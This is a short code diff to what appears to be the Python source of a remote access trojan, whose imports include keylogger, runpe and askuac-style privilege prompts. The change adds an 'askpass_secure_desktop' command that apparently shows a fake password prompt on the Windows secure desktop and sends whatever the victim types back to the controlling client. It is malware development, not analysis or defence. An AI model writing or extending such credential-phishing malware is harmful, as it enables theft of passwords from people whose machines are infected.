@@ -41,6 +41,7 @@ import winerror
 import wmi
 from Crypto.Cipher import AES
 
+import askpass
 import filewatch
 import keylogger
 import runpe
@@ -643,6 +644,16 @@ class Command:
                     return 1, password
         except Exception as exception:
             return 0, '[-] Error: {}'.format(exception)
+
+    @staticmethod
+    def askpass_secure_desktop(client):
+        def func(result):
+            client.send_text(1, result)
+
+        try:
+            askpass.switch_desktop(func)
+        except Exception as exception:
+            client.send_text(0, '[-] {}'.format(exception))
 
     @staticmethod
     def askuac():
